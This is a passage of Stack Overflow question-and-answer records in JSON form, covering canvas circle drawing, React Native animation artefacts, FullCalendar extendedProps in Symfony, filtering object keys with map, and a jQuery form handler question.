"https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559157254, "post_id": 56264920, "comment_id": 99337301, "body": "Is there anyway to do the same thing, but instead of having it appear randomly, have it go in line? I&#39;ve tried working that out, but I think my formatting isn&#39;t permitting it to happen."}, {"owner": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559157643, "post_id": 56264920, "comment_id": 99337455, "body": "<code>@obscure</code> please, I didn&#39;t know how to tag"}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559160545, "post_id": 56264920, "comment_id": 99338595, "body": "You mean horizontally next to each other from left to right? Or randomly in line upwards downwards?"}, {"owner": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559161776, "post_id": 56264920, "comment_id": 99339059, "body": "Horizontally I mean <code>@obscure</code>"}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559164061, "post_id": 56264920, "comment_id": 99339853, "body": "@JaleeyahAnderson - I refined my answer above!"}, {"owner": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559164691, "post_id": 56264920, "comment_id": 99340052, "body": "Thank you! <code>@obscure</code>"}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "edited": false, "score": 0, "creation_date": 1559169530, "post_id": 56264920, "comment_id": 99341355, "body": "No problem @JaleeyahAnderson. Glad I could help! =)"}], "tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": true, "score": 1, "last_activity_date": 1559164331, "last_edit_date": 1559164331, "creation_date": 1558558672, "answer_id": 56264920, "question_id": 56264852, "link": "https://stackoverflow.com/questions/56264852/how-to-make-multiple-circles-with-canvas-js/56264920#56264920", "title": "How to make multiple circles with Canvas JS", "body": "<p>At the moment you're putting the circle at a pre-determined location:</p>\n\n<pre><code>var W=canvas.width / 2;\nvar H=canvas.height / 2;\n</code></pre>\n\n<p>This is the center of the canvas element. As a side note - the variable names <strong>W</strong> and <strong>H</strong> are a bit misleading because the corresponding  parameters of the <strong>arc()</strong> function are actually the x and y position. Anyway, If you want to have circles at random positions, you can utilize the <strong>Math.random()</strong> function. It returns a random number between 0 and 1. If you multiply that by the width / height of the canvas you'll have circles all around the canvas.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function nerdsAssemble() {\r\n  var canvas = document.getElementById(\"boop\");\r\n  if (canvas.getContext) {\r\n    var con = canvas.getContext(\"2d\");\r\n    var W = Math.random() * canvas.width;\r\n    var H = Math.random() * canvas.height;\r\n    var rad = 45;\r\n    con.beginPath();\r\n    con.arc(W, H, rad, 0, 2 * Math.PI, false);\r\n    con.stroke();\r\n  }\r\n\r\n}\r\ndocument.getElementById(\"myButton\").addEventListener(\"click\", nerdsAssemble);</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;canvas id=\"boop\" width=\"400\" height=\"300\"&gt;&lt;/canvas&gt;\r\n&lt;button id=\"myButton\"&gt;\r\nCircle\r\n&lt;/button&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<h2>Followup</h2>\n\n<p>If you want new circles appear next to each other from left to the right we need to change some things.\nFirst we need some variables that hold the position of a circle. Let's call those xPosition and yPosition. The initial value of xPosition should be 45. Why 45? 45 is the radius of the circle as determined by the equally named variable radius and a horizontal position of 45 means we're touching the left side of the canvas.</p>\n\n<p>Now if we increment the xPosition by radius * 2 (90, is the diameter of the circle) after drawing a circle, the next circle will be next to the last one.</p>\n\n<p>Here's some code:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var canvas = document.getElementById(\"boop\");\r\nvar radius = 45;\r\nvar xPosition = radius;\r\nvar yPosition = canvas.height / 2;\r\nvar con = canvas.getContext(\"2d\");\r\n\r\nfunction nerdsAssemble() {\r\n  con.beginPath();\r\n  con.arc(xPosition, yPosition, radius, 0, 2 * Math.PI, false);\r\n  con.stroke();\r\n  xPosition += radius * 2;\r\n}\r\ndocument.getElementById(\"myButton\").addEventListener(\"click\", nerdsAssemble);</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;canvas id=\"boop\" width=\"400\" height=\"300\"&gt;&lt;/canvas&gt;\r\n&lt;button id=\"myButton\"&gt;\r\nCircle\r\n&lt;/button&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": "https://stackoverflow.com/users/10393600/jaleeyah-anderson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 256, "favorite_count": 0, "accepted_answer_id": 56264920, "answer_count": 1, "score": 1, "last_activity_date": 1559164331, "creation_date": 1558558327, "last_edit_date": 1558558641, "question_id": 56264852, "link": "https://stackoverflow.com/questions/56264852/how-to-make-multiple-circles-with-canvas-js", "title": "How to make multiple circles with Canvas JS", "body": "<p>I have a function that makes a circle when I click on a button but if I keep clicking the button, it just copies the circle in the same place. I'm trying to figure out a way to make multiple circles with different xy positions. I have the code below</p>\n\n<pre><code>function nerdsAssemble(){\n  var canvas = document.getElementById(\"boop\");\nif (canvas.getContext)\n  {\n    var con=canvas.getContext(\"2d\");\n    var W=canvas.width / 2;\n    var H=canvas.height / 2;\n    var rad=45;\n    con.beginPath();\n    con.arc(W, H, rad, 0, 2 * Math.PI, false);\n    con.stroke();\n    }\n  }\n}\n</code></pre>\n"}, {"tags": ["javascript", "react-native", "animation", "styled-components", "popmotion"], "comments": [{"owner": {"reputation": 19848, "user_id": 1090206, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/BVW9D.jpg?s=128&g=1", "display_name": "Chris W.", "link": "https://stackoverflow.com/users/1090206/chris-w"}, "edited": false, "score": 0, "creation_date": 1558560071, "post_id": 56264783, "comment_id": 99146694, "body": "Are you completely dependent on this library or are you open to just using your own css so you can apply properties like <code>backface-visibility</code>, <code>font-smoothing</code> and force hardware acceleration?"}, {"owner": {"reputation": 525, "user_id": 1033853, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/2AJFD.jpg?s=128&g=1", "display_name": "juliusbangert", "link": "https://stackoverflow.com/users/1033853/juliusbangert"}, "reply_to_user": {"reputation": 19848, "user_id": 1090206, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/BVW9D.jpg?s=128&g=1", "display_name": "Chris W.", "link": "https://stackoverflow.com/users/1090206/chris-w"}, "edited": false, "score": 0, "creation_date": 1558562344, "post_id": 56264783, "comment_id": 99147377, "body": "@ChrisW. I am using React Native for mobile development. This does not have CSS."}], "owner": {"reputation": 525, "user_id": 1033853, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/2AJFD.jpg?s=128&g=1", "display_name": "juliusbangert", "link": "https://stackoverflow.com/users/1033853/juliusbangert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 117, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558557996, "creation_date": 1558557996, "question_id": 56264783, "link": "https://stackoverflow.com/questions/56264783/weird-antialias-artefacting-with-react-native-on-nested-posed-components", "title": "Weird antialias artefacting with react native on nested posed components", "body": "<p>I am creating a component that animates a group of buttons in an elastic staggered way using <code>react-native-pose</code>. The buttons them selves use <em>pose</em> to animate the pressed state. I have almost got it looking how I want it although I'm not sure I'm doing things correctly. </p>\n\n<p>This is what I want to achhieve...\n<a href=\"https://i.stack.imgur.com/gceOg.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/gceOg.gif\" alt=\"enter image description here\"></a></p>\n\n<p>... However the text looks awful like its got jpg artefacts on it :</p>\n\n<p><a href=\"https://i.stack.imgur.com/wdUWK.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wdUWK.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>App.js</strong></p>\n\n<pre><code>import React, { Component } from 'react';\nimport styled from 'styled-components';\nimport posed from 'react-native-pose';\nimport Button from './src/components/Button';\n\nconst ScreenContainer = styled.View({\n  flex: 1,\n  padding: 20,\n  marginTop: 100\n});\n\nconst Buttons = posed.View({\n  visible: {\n    staggerChildren: 100\n  },\n  hidden: {\n    staggerChildren: 100\n  }\n});\n\nexport default class App extends Component {\n  state = {\n    buttonPose: 'hidden'\n  };\n\n  items = [\n    { id: 0, label: 'One' },\n    { id: 1, label: 'Two' },\n    { id: 2, label: 'Three' }\n  ];\n\n  componentDidMount = () =&gt; {\n    this.setState({\n      buttonPose: 'visible'\n    });\n  };\n\n  render() {\n    return (\n      &lt;ScreenContainer&gt;\n        &lt;Buttons pose={this.state.buttonPose}&gt;\n          {this.items.map(item =&gt; (\n            &lt;Button label={item.label} key={item.id} /&gt;\n          ))}\n        &lt;/Buttons&gt;\n      &lt;/ScreenContainer&gt;\n    );\n  }\n}\n</code></pre>\n\n<p><strong>Button.js</strong></p>\n\n<pre><code>import React, { PureComponent } from 'react';\nimport { TouchableWithoutFeedback } from 'react-native';\nimport styled from 'styled-components';\nimport posed from 'react-native-pose';\n\nconst Container = styled(\n  posed.View({\n    visible: {\n      opacity: 1,\n      x: 0\n    },\n    hidden: {\n      opacity: 0,\n      x: -100\n    }\n  })\n)({\n  marginBottom: 20\n});\n\nconst Background = styled(\n  posed.View({\n    // If I comment out these poses the problem goes away\n    pressIn: {\n      scale: 1.1\n    },\n    pressOut: {\n      scale: 1\n    }\n  })\n)({\n  padding: 20,\n  backgroundColor: '#f9415d',\n  borderRadius: 10\n});\n\nconst Label = styled.Text({\n  fontSize: 18,\n  color: 'white',\n  textAlign: 'center'\n});\n\nexport default class Button extends PureComponent {\n  state = {\n    buttonPose: 'pressOut'\n  };\n\n  onPressIn = () =&gt; {\n    this.setState({\n      buttonPose: 'pressIn'\n    });\n  };\n\n  onPressOut = () =&gt; {\n    this.setState({\n      buttonPose: 'pressOut'\n    });\n  };\n\n  componentDidMount = () =&gt; {};\n\n  render() {\n    const { onPressIn, onPressOut } = this;\n    const { buttonPose } = this.state;\n    const { label } = this.props;\n    return (\n      &lt;Container&gt;\n        &lt;TouchableWithoutFeedback onPressIn={onPressIn} onPressOut={onPressOut}&gt;\n          &lt;Background pose={buttonPose} withParent={false}&gt;\n            &lt;Label&gt;{label}&lt;/Label&gt;\n          &lt;/Background&gt;\n        &lt;/TouchableWithoutFeedback&gt;\n      &lt;/Container&gt;\n    );\n  }\n}\n</code></pre>\n\n<p>Can anyone offer any insight into why the text and also the rounded corners look so artifacted and low res?</p>\n"}, {"tags": ["javascript", "symfony", "fullcalendar", "undefined", "fullcalendar-4"], "answers": [{"comments": [{"owner": {"reputation": 43836, "user_id": 5947043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jUK37.png?s=128&g=1", "display_name": "ADyson", "link": "https://stackoverflow.com/users/5947043/adyson"}, "reply_to_user": {"reputation": 17, "user_id": 11518024, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-7YUBWxA0Lsw/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMnjnSGcDMNF-okt62JHS5xhSpfhg/mo/photo.jpg?sz=128", "display_name": "Mnavarro", "link": "https://stackoverflow.com/users/11518024/mnavarro"}, "edited": false, "score": 0, "creation_date": 1558652506, "post_id": 56271645, "comment_id": 99181687, "body": "No problem. If the answer has helped you please remember to mark it as &quot;accepted&quot; (click the tick mark next to the answer so it turns green) - thanks :-)"}], "tags": [], "owner": {"reputation": 43836, "user_id": 5947043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jUK37.png?s=128&g=1", "display_name": "ADyson", "link": "https://stackoverflow.com/users/5947043/adyson"}, "is_accepted": true, "score": 0, "last_activity_date": 1558602250, "creation_date": 1558602250, "answer_id": 56271645, "question_id": 56264782, "link": "https://stackoverflow.com/questions/56264782/symfony-fullcalendar-event-description-undefined/56271645#56271645", "title": "Symfony - Fullcalendar event description undefined", "body": "<p>The <a href=\"https://fullcalendar.io/docs/event-parsing\" rel=\"nofollow noreferrer\">event parsing documentation</a> states that</p>\n\n<blockquote>\n  <p>Every other non-standard prop will be transferred over to the\n  extendedProps hash in the Event Object.</p>\n</blockquote>\n\n<p>Since <code>description</code> and <code>mail</code> are not standard event properties in fullCalendar (as listed in that documentation), then they will be placed under the \"extendedProps\" object in the final event object which fullCalendar creates based on the data it receives from your server.</p>\n\n<p>Therefore in your <code>eventClick</code> code you should be able to write</p>\n\n<pre><code>$('#ev_desc').html('Descripcion: ' + eventObj.extendedProps.description);\n$('#ev_mail').html('Mail: ' + eventObj.extendedProps.mail);\n</code></pre>\n\n<p>and populate the properties successfully into your modal.</p>\n\n<p>P.S. This behaviour is also mentioned in the <a href=\"https://fullcalendar.io/docs/event-object\" rel=\"nofollow noreferrer\">event object documentation</a> as well. If you have previously used fullCalendar version 3 or below, then this is a change from how these earlier versions worked.</p>\n"}], "owner": {"reputation": 17, "user_id": 11518024, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-7YUBWxA0Lsw/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMnjnSGcDMNF-okt62JHS5xhSpfhg/mo/photo.jpg?sz=128", "display_name": "Mnavarro", "link": "https://stackoverflow.com/users/11518024/mnavarro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 497, "favorite_count": 0, "accepted_answer_id": 56271645, "answer_count": 1, "score": 1, "last_activity_date": 1558602250, "creation_date": 1558557995, "last_edit_date": 1558602005, "question_id": 56264782, "link": "https://stackoverflow.com/questions/56264782/symfony-fullcalendar-event-description-undefined", "title": "Symfony - Fullcalendar event description undefined", "body": "<p>I have a controller that gets data from database and turns it in events for fullcalendar, when I display a modal clicking in one of this events, it shows that description and email are undefined.</p>\n\n<p><a href=\"https://i.stack.imgur.com/kQddt.png\" rel=\"nofollow noreferrer\">Image of modal undefined fields</a></p>\n\n<p>But in XHR I can see that im receiving all the data from the controller.</p>\n\n<p><a href=\"https://i.stack.imgur.com/eye0h.png\" rel=\"nofollow noreferrer\">Image of XHR GET</a></p>\n\n<p>Modal:</p>\n\n<pre><code>&lt;div id=\"fullCalModal\" class=\"modal fade\" style=\"z-index: 9999;&gt;\n&lt;div class=\"modal-dialog\"&gt;\n    &lt;div class=\"modal-content\"&gt;\n        &lt;div class=\"modal-header\"&gt;\n\n            &lt;h4 id=\"modalTitle\" class=\"modal-title\"&gt;&lt;/h4&gt;\n        &lt;/div&gt;\n        &lt;div id=\"modalBody\" class=\"modal-body\"&gt;         \n\n        &lt;p id=\"ev_start\" class=\"modal-body\"&gt;&lt;/p&gt;\n        &lt;p id=\"ev_end\" class=\"modal-body\"&gt;&lt;/p&gt;\n        &lt;p id=\"ev_mail\" class=\"modal-body\"&gt;&lt;/p&gt;\n        &lt;p id=\"ev_desc\" class=\"modal-body\"&gt;&lt;/p&gt;\n\n        &lt;/div&gt;\n        &lt;div class=\"modal-footer\"&gt;\n            &lt;button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"&gt;Close&lt;/button&gt;\n            &lt;button class=\"btn btn-primary\"&gt;&lt;a id=\"eventUrl\" target=\"_blank\"&gt;Event Page&lt;/a&gt;&lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p></p>\n\n<hr>\n\n<p>Javascript:</p>\n\n<pre><code>eventClick: function(info) {\n    var eventObj = info.event;      \n\n\n      alert('Clicked ' + eventObj.title + ' with id: ' + eventObj.id + eventObj.description);\n\n        $('#modalTitle').html(eventObj.title);\n        $('#ev_titulo').html(eventObj.title);\n\n        $('#ev_start').html('Fecha inicio: ' + eventObj.start);\n        $('#ev_end').html('Fecha fin: ' + eventObj.end);\n        $('#ev_desc').html('Descripcion: ' + eventObj.description);\n        $('#ev_mail').html('Mail: ' + eventObj.mail);\n\n\n        $('#fullCalModal').modal('show');\n\n  },\n</code></pre>\n\n<hr>\n\n<p>Controller:</p>\n\n<pre><code>public function loadAction()\n{\n\n    $em = $this-&gt;getDoctrine()-&gt;getManager();\n    $eventos = $em-&gt;getRepository('App:Evento')-&gt;findAll();\n\n    $data = array();\n\n    foreach ($eventos as $evento)\n    {       \n        $events['id'] = $evento-&gt;getId();\n        $events['title'] = $evento-&gt;getTitle();\n        $events['start'] = $evento-&gt;getBeginAt()-&gt;format('Y-m-d');;\n        $events['end'] = $evento-&gt;getEndAt()-&gt;format('Y-m-d');;\n        $events['color'] = $evento-&gt;getColor();\n        $events['description'] = $evento-&gt;getDescription();\n        $events['mail'] = $evento-&gt;getMail();\n        array_push($data, $events);\n    }\n\n        return $this-&gt;json($data);\n\n}\n</code></pre>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558557955, "post_id": 56264754, "comment_id": 99145871, "body": "Note that there is an <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter\" rel=\"nofollow noreferrer\"><code>Array.filter()</code></a> method. It returns a new array consisting only of elements that satisfy the passed conditional/callback. This in mind, your question could really benefit from a small snippet of actual data, along with the expected result. When you say &quot;I want to filter some pairs&quot;, it&#39;s not clear if you mean filter them <i>out</i>, or filter everything <i>else</i> out. It&#39;s also not clear on what the filtering logic is supposed to be."}, {"owner": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 0, "creation_date": 1558558199, "post_id": 56264754, "comment_id": 99145960, "body": "I don&#39;t know if <code>filter()</code> apply in this case. I believe he needs to drop some <code>properties</code> of the objects that are inside the array. Could you elaborate with a sample of input and expected output?"}, {"owner": {"reputation": 33, "user_id": 10670289, "user_type": "registered", "profile_image": "https://graph.facebook.com/202968420196720/picture?type=large", "display_name": "Tadeu Moreira", "link": "https://stackoverflow.com/users/10670289/tadeu-moreira"}, "edited": false, "score": 0, "creation_date": 1558558342, "post_id": 56264754, "comment_id": 99146012, "body": "I guess I&#39;ve used an unaccurate term. My goal is not to impose conditions, but just to really discard some pairs from every object. Let we say I want only k1=&gt;v1 and k2=&gt;v2 from every object. It&#39;s kind of analogue to <code>SELECT (row1,row2,...)...</code> in SQL"}, {"owner": {"reputation": 5440, "user_id": 417866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/958d07f426a20a9bc1bb7db75086f9d5?s=128&d=identicon&r=PG", "display_name": "Arash Motamedi", "link": "https://stackoverflow.com/users/417866/arash-motamedi"}, "edited": false, "score": 0, "creation_date": 1558558345, "post_id": 56264754, "comment_id": 99146013, "body": "Can you provide a sample input value, and the expected output to help illustrate what you&#39;re trying to do?"}, {"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 0, "creation_date": 1558558501, "post_id": 56264754, "comment_id": 99146084, "body": "Promises? Responses? <code>.map</code> function? <code>Map</code> objects? Filtering? I have no idea what these have to do with another, or what you want to do."}, {"owner": {"reputation": 33, "user_id": 10670289, "user_type": "registered", "profile_image": "https://graph.facebook.com/202968420196720/picture?type=large", "display_name": "Tadeu Moreira", "link": "https://stackoverflow.com/users/10670289/tadeu-moreira"}, "edited": false, "score": 0, "creation_date": 1558558627, "post_id": 56264754, "comment_id": 99146131, "body": "I&#39;ve updated with an input/output example"}, {"owner": {"reputation": 6792, "user_id": 254343, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/YEat6.png?s=128&g=1", "display_name": "amn", "link": "https://stackoverflow.com/users/254343/amn"}, "edited": false, "score": 0, "creation_date": 1558558803, "post_id": 56264754, "comment_id": 99146194, "body": "Dear @TadeuMoreira, there are many questions on Stack Overflow on how to map arrays and transform them into objects of all kinds, I see one question like this every day. I know you probably know SO from a friend but please do take time to read some of <a href=\"https://stackoverflow.com/help\">stackoverflow.com/help</a>, I think it will help you in the long run. Search for &quot;map transform array object keys values&quot; and you will find some information that will help you debug your code problem. Also, welcome to Stack Overflow!"}, {"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558558985, "post_id": 56264754, "comment_id": 99146282, "body": "As I don&#39;t see it as an option in the marked duplicate, I would suggest using <code>.map()</code> so that you leave your original array unaltered: <code>input.map(({name, age}) =&gt; ({name: name, age: age}))</code>"}, {"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558559054, "post_id": 56264754, "comment_id": 99146307, "body": "I would also suggest <a href=\"https://stackoverflow.com/questions/44348862/remove-key-from-all-objects-in-array\"><b>this</b></a> as more apt duplicate."}, {"owner": {"reputation": 33, "user_id": 10670289, "user_type": "registered", "profile_image": "https://graph.facebook.com/202968420196720/picture?type=large", "display_name": "Tadeu Moreira", "link": "https://stackoverflow.com/users/10670289/tadeu-moreira"}, "edited": false, "score": 0, "creation_date": 1558559156, "post_id": 56264754, "comment_id": 99146345, "body": "Thanks for the resources, I&#39;ll give them all a read. And thanks for the patience because it seems to be a recurring type of question"}, {"owner": {"reputation": 33, "user_id": 10670289, "user_type": "registered", "profile_image": "https://graph.facebook.com/202968420196720/picture?type=large", "display_name": "Tadeu Moreira", "link": "https://stackoverflow.com/users/10670289/tadeu-moreira"}, "edited": false, "score": 0, "creation_date": 1558559482, "post_id": 56264754, "comment_id": 99146481, "body": "So, this question is actually solved <a href=\"https://stackoverflow.com/questions/44348862/remove-key-from-all-objects-in-array\">here</a> instead of the topic to which this was marked as duplicate, because I&#39;d have to spend way too many lines with delete. Don&#39;t know if this can be fixed"}], "owner": {"reputation": 33, "user_id": 10670289, "user_type": "registered", "profile_image": "https://graph.facebook.com/202968420196720/picture?type=large", "display_name": "Tadeu Moreira", "link": "https://stackoverflow.com/users/10670289/tadeu-moreira"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 89, "favorite_count": 0, "closed_date": 1558558742, "answer_count": 0, "score": 0, "last_activity_date": 1558558784, "creation_date": 1558557889, "last_edit_date": 1558558602, "question_id": 56264754, "link": "https://stackoverflow.com/questions/56264754/how-to-filter-key-value-pairs-with-map-function", "closed_reason": "Duplicate", "title": "How to filter key=&gt;value pairs with map function?", "body": "<p>I receive a json object with a promise call that has the following structure:</p>\n\n<p><code>[{ key1:'value1', key2:'value2',...},{ key1:'value1', key2:'value2',...},...]</code></p>\n\n<p>what I wanna do with this is to \"filter\" some <code>keyx:'valuex'</code> pairs from every object (which could be done with a map function, I suppose).</p>\n\n<p>The best I could accomplish was by doing:</p>\n\n<p><code>x.response.map((r) =&gt; new Map([['number',r.number],['hash', r.hash]]))</code></p>\n\n<p>But that gives me a\u00a0<code>[Map(2), Map(2)]</code> object</p>\n\n<p>I want simply a <code>[{...}, {...}]</code> object</p>\n\n<p>Example:</p>\n\n<p><b>Input:</b></p>\n\n<p>[{id:1, name:'John', age:30}, {id:2, name:'Mary', age: 24}, {id:3, name:'Jack', age: 32}]</p>\n\n<p><b>Output:</b></p>\n\n<p>[{name:'John', age:30}, {name:'Mary', age: 24}, {name:'Jack', age: 32}]</p>\n"}, {"tags": ["javascript", "jquery", "marketo"], "comments": [{"owner": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558558471, "post_id": 56264738, "comment_id": 99146073, "body": "$(document).on(&#39;change&#39;,&#39;&#39;[name=&quot;contact_iminterestedin&quot;]&#39;&#39;,&zwnj;&#8203;function(){     const selected = $(this).val();     const matchValue = $(<code>#Initial_Product_Requested__c option[value=&quot;${  selected  }&quot;]</code>);     matchValue.prop(&#39;selected&#39;, true);   });    can you try this one, its because when the items are shown in the page the event handler is already binded to an element, so you want to register an event handler to the document it selfe rather than to a specific tag."}, {"owner": {"reputation": 199, "user_id": 2758089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8f75c8085da81d3799b1a1291162a1f?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno Gomes", "link": "https://stackoverflow.com/users/2758089/bruno-gomes"}, "reply_to_user": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558559103, "post_id": 56264738, "comment_id": 99146324, "body": "Seems there are parsing errors with that. @Rinor Dreshaj"}, {"owner": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558559377, "post_id": 56264738, "comment_id": 99146435, "body": "can you check if that is firing though, than maybe its a problem inside your code?"}, {"owner": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558560552, "post_id": 56264738, "comment_id": 99146858, "body": 